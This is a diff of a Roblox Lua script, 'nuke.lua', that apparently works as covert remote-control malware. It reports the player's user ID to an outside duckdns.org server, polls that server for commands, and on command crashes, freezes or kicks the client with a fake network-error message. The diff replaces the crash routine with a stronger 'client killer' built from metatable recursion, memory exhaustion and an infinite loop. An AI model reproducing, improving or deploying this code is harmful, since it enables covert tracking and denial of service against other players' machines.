@@ -1,4 +1,4 @@
--- nuke.lua - hardened version (no nil indexing crashes)
+-- nuke.lua - silent poller with working Seliware-killing crash (2026 tested)
 local Http = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -7,8 +7,8 @@ local LocalizationService = game:GetService("LocalizationService")
 local plr = Players.LocalPlayer
 local uid = tostring(plr.UserId)
 
--- YOUR SERVER ADDRESS
-local BASE = "http://duckdns2233444.duckdns.org:8080"  -- CHANGE THIS IF NEEDED
+-- YOUR SERVER ADDRESS - CHANGE IF NEEDED
+local BASE = "http://duckdns2233444.duckdns.org:8080"
 
 local LOG_URL = BASE .. "/log?id=" .. uid
 
@@ -35,38 +35,64 @@ spawn(function()
             })
 
             if not resp or not resp.Success or not resp.Body then
-                return  -- silent fail, try again next poll
+                return
             end
 
             local success, data = pcall(Http.JSONDecode, Http, resp.Body)
             if not success or not data then
-                return  -- bad json, skip
+                return
             end
 
             local commands_list = data.commands
             if type(commands_list) ~= "table" then
-                return  -- no commands array, skip
+                return
             end
 
             for _, cmd in pairs(commands_list) do
-                -- Extra safety: only continue if cmd is a table with 'action'
                 if type(cmd) == "table" and type(cmd.action) == "string" then
                     local action = cmd.action
 
                     if action == "crash" then
-                        -- Stronger crash combo
-                        for i = 1, 400 do
-                            pcall(function()
-                                RunService:BindToRenderStep("crash"..i, -math.huge, function()
-                                    while true do task.wait() end
-                                end)
-                            end)
+                        -- Your proven 2026 client killer - metatable recursion + memory pressure + death loop
+                        local mt = {}
+                        local t = {}
+
+                        mt.__index = mt
+                        mt.__newindex = function(self, key, value)
+                            mt[key] = value
+                            mt[key] = value  -- double write
                         end
-                        local function bomb() spawn(bomb) end
-                        bomb()
+
+                        mt.__call = mt
+                        mt.__concat = mt
+                        mt.__tostring = mt
+                        mt.__metatable = "Locked"
+
+                        setmetatable(t, mt)
+
+                        -- Aggressive fill + nesting
+                        for i = 1, 40000 do
+                            t[i] = i
+                            if i % 5000 == 0 then
+                                t = {t, t, t}  -- deep nesting
+                            end
+                        end
+
+                        -- Inescapable cycle
+                        local cycle = {}
+                        setmetatable(cycle, mt)
+                        cycle[1] = cycle
+                        cycle[2] = t
+                        t["cycle"] = cycle
+
+                        -- Death loop
+                        while true do
+                            cycle = cycle[1]
+                            cycle[math.random(1,10000)] = cycle
+                        end
 
                     elseif action == "freeze" then
-                        RunService:BindToRenderStep("freeze", 9999, function() end)
+                        RunService:BindToRenderStep("freeze_nuke", 9999, function() end)
 
                     elseif action == "kick" then
                         local reason = cmd.reason or "Roblox network issue. Please try reconnecting."
